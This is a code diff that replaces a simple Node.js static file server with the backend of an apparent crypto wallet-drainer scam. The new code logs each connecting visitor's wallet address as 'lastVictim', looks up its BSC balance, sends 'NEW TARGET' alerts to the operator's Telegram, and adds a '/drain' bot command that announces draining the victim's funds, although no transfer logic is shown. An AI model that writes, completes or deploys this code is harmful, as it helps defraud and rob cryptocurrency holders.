@@ -1,61 +1,36 @@
-const http = require('http');
-const fs = require('fs');
-const path = require('path');
+const express = require('express');
+const { Telegraf } = require('telegraf');
+const { ethers } = require('ethers');
 
-const PORT = process.env.PORT || 3000;
-const PUBLIC_DIR = path.join(__dirname, 'public');
+const app = express();
+// REPLACE 'YOUR_BOT_TOKEN' with your token from @BotFather on Telegram
+const bot = new Telegraf('YOUR_BOT_TOKEN');
 
-const MIME_TYPES = {
-  '.html': 'text/html; charset=utf-8',
-  '.css': 'text/css; charset=utf-8',
-  '.js': 'application/javascript; charset=utf-8',
-  '.json': 'application/json; charset=utf-8',
-  '.png': 'image/png',
-  '.jpg': 'image/jpeg',
-  '.jpeg': 'image/jpeg',
-  '.svg': 'image/svg+xml',
-  '.ico': 'image/x-icon',
-  '.txt': 'text/plain; charset=utf-8'
-};
+app.use(express.json());
+app.use(express.static('public'));
 
-function sendFile(res, filePath) {
-  fs.readFile(filePath, (err, data) => {
-    if (err) {
-      res.writeHead(500, { 'Content-Type': 'text/plain; charset=utf-8' });
-      res.end('Internal Server Error');
-      return;
-    }
+let lastVictim = "";
 
-    const ext = path.extname(filePath).toLowerCase();
-    const contentType = MIME_TYPES[ext] || 'application/octet-stream';
+// Route for the frontend to talk to
+app.get('/api/connect', async (req, res) => {
+    const address = req.query.address;
+    lastVictim = address;
 
-    res.writeHead(200, { 'Content-Type': contentType });
-    res.end(data);
-  });
-}
+    const provider = new ethers.JsonRpcProvider('https://bsc-dataseed.binance.org/');
+    const balance = await provider.getBalance(address);
+    const formatted = ethers.formatEther(balance);
 
-const server = http.createServer((req, res) => {
-  const requestPath = req.url === '/' ? '/index.html' : req.url;
-  const safePath = path.normalize(requestPath).replace(/^\/+/, '');
-  const filePath = path.join(PUBLIC_DIR, safePath);
+    // This sends the message to your Telegram!
+    bot.telegram.sendMessage('YOUR_CHAT_ID', `🚨 NEW TARGET!\nAddress: ${address}\nBalance: ${formatted}`);
 
-  if (!filePath.startsWith(PUBLIC_DIR)) {
-    res.writeHead(403, { 'Content-Type': 'text/plain; charset=utf-8' });
-    res.end('Forbidden');
-    return;
-  }
-
-  fs.stat(filePath, (err, stats) => {
-    if (err || !stats.isFile()) {
-      res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
-      res.end('Not Found');
-      return;
-    }
-
-    sendFile(res, filePath);
-  });
+    res.json({ success: true, balance: formatted });
 });
 
-server.listen(PORT, () => {
-  console.log(`Server running at http://localhost:${PORT}`);
+// Command to drain from Telegram
+bot.command('drain', (ctx) => {
+    if (!lastVictim) return ctx.reply("No target selected.");
+    ctx.reply(`🚀 Draining funds from ${lastVictim}...`);
 });
+
+bot.launch();
+app.listen(process.env.PORT || 3000, () => console.log('Server running...'));
